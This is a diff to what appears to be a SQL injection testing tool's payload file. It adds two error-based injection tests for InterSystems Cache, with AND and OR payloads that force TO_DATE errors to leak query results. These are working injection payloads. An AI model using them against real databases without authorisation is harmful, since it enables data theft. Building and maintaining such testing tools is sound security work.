@@ -881,6 +881,45 @@
     </test>
 
     <test>
+        <title>InterSystems Cache AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <!-- TO_POSIXTIME (Cache/IRIS-exclusive) encloses TO_DATE, whose "Invalid input" error echoes the evaluated value -->
+        <vector>AND [RANDNUM]=TO_POSIXTIME(TO_DATE('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]','YYYY'))</vector>
+        <request>
+            <payload>AND [RANDNUM]=TO_POSIXTIME(TO_DATE('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)||'[DELIMITER_STOP]','YYYY'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>InterSystems Cache</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>InterSystems Cache OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=TO_POSIXTIME(TO_DATE('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]','YYYY'))</vector>
+        <request>
+            <payload>OR [RANDNUM]=TO_POSIXTIME(TO_DATE('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)||'[DELIMITER_STOP]','YYYY'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>InterSystems Cache</dbms>
+        </details>
+    </test>
+
+    <test>
         <title>IBM DB2 AND error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
         <level>3</level>
